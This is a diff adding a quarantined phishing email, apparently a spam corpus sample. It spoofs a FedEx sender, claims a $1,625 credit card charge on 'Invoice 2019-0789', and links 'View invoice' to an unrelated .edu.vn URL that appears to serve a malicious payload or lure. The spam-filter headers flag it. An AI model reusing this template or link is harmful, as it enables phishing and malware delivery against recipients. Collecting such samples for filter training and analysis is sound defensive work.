@@ -1,0 +1,96 @@
+Return-Path: <fin_globechd@globeauto.in>
+Delivered-To: spam-quarantine
+X-Envelope-To: <mark.staller@fedex.com>
+X-Envelope-To-Blocked: <mark.staller@fedex.com>
+X-Quarantine-ID: <a6ihthdU7NS9>
+X-Spam-Flag: YES
+X-Spam-Score: 6.431
+X-Spam-Level: ******
+X-Spam-Status: Yes, score=6.431 tag=2 tag2=6.31 kill=6.31
+	tests=[ALL_TRUSTED=-1, DKIM_ADSP_DISCARD=1.8, HTML_MESSAGE=0.001,
+	LOTS_OF_MONEY=0.001, MIME_HTML_ONLY=1.105,
+	RAZOR2_CF_RANGE_51_100=0.365, RAZOR2_CF_RANGE_E8_51_100=2.43,
+	RAZOR2_CHECK=1.729] autolearn=no
+Received: from mx10.jcbl.com ([127.0.0.1])
+	by localhost (mx9.jcbl.com [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id a6ihthdU7NS9 for <mark.staller@fedex.com>;
+	Tue,  5 Feb 2019 00:16:31 +0530 (IST)
+Received: from [10.1.18.26] (unknown [186.103.233.170])
+	by mx10.jcbl.com (Postfix) with ESMTPSA id E0B33F4D875
+	for <mark.staller@fedex.com>; Mon,  4 Feb 2019 19:42:36 +0530 (IST)
+Date: Mon, 04 Feb 2019 11:15:56 -0400
+From:  Cathy Lefik <cathy.lefik@fedex.com> <fin_globechd@globeauto.in>
+To: mark.staller@fedex.com
+Message-Id: <HYgJ0UT3b6Nv9cHMB7jvpzC8aEAO3sgw6YqMojzMMr3C3u0qvEl@fedex.com>
+Subject: Invoice 2019-0789 from Cathy Lefik
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_Part_60607_1141741232.40462347822333266227"
+
+------=_Part_60607_1141741232.40462347822333266227
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE html><html width=3D"100%" height=3D"100%"><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dutf-8">
+    <meta content=3D"width=3Ddevice-width" name=3D"viewport">
+    <meta content=3D"telephone=3Dno" name=3D"format-detection">  =20
+  </head>
+  <body>
+    <p>Hello,</p>
+<p>We just processed the payment for your Cathy Lefik  account and charged =
+your credit card for $1,625.00.=20
+<br>
+</p>
+<p>=0DPlease do not hesitate to contact us for further assistance.</p>
+<p>=0DThanking you in advance for your assistance.
+</p>
+<p>Best wishes
+<br>
+</p>
+<div style=3D"width: 450px; font-family: Helvetica,Arial,sans-serif; font-s=
+ize: 13px; color: black; padding: 15px 10px; border: 2px solid #999999;">
+  <p style=3D"font-size: 18px; font-weight: bold; color: black; margin: 0 0=
+ 10px;">
+    Invoice 2019-0789 </p>
+  <table style=3D"border-collapse: collapse; margin: 0; padding: 0; border:=
+ 0;">
+    <tr>
+      <td style=3D"font-family: Helvetica,Arial,sans-serif; font-size: 13px=
+; color: black; height: auto; padding: 0 10px 0 0;"><strong>Sender:</strong=
+></td>
+      <td style=3D"font-family: Helvetica,Arial,sans-serif; font-size: 13px=
+; color: black; height: auto; padding: 0;">Cathy Lefik</td>
+    </tr>
+    <tr>
+      <td style=3D"font-family: Helvetica,Arial,sans-serif; font-size: 13px=
+; color: black; height: auto; padding: 0 10px 0 0;"><strong>Invoice date:</=
+strong></td>
+      <td style=3D"font-family: Helvetica,Arial,sans-serif; font-size: 13px=
+; color: black; height: auto; padding: 0;">01-30-2019</td>
+    </tr>
+    <tr>
+      <td style=3D"font-family: Helvetica,Arial,sans-serif; font-size: 13px=
+; color: black; height: auto; padding: 0 10px 0 0;"><strong>Due date:</stro=
+ng></td>
+      <td style=3D"font-family: Helvetica,Arial,sans-serif; font-size: 13px=
+; color: black; height: auto; padding: 0;">02-04-2019</td>
+    </tr>
+    <tr>
+      <td style=3D"font-family: Helvetica,Arial,sans-serif; font-size: 13px=
+; color: black; height: auto; padding: 0 10px 0 0;"><strong>Amount due:</st=
+rong></td>
+      <td style=3D"font-family: Helvetica,Arial,sans-serif; font-size: 13px=
+; color: black; height: auto; padding: 0;">$0.00
+      (Amount paid: $1,625.00)
+      </td>
+    </tr>
+  </table>
+  <p style=3D"background-color: #EEE; font-family: Helvetica,Arial,sans-ser=
+if; font-size: 13px; margin: 10px 0 0; padding: 10px;" align=3D"center">
+        <a href=3D"http://thptngochoi.edu.vn/ZyrOs_Dr-OBHEQh/uo/Payment_det=
+ails/022019">View invoice</a>
+  </p>
+</div>
+</body>
+</html>
+------=_Part_60607_1141741232.40462347822333266227--
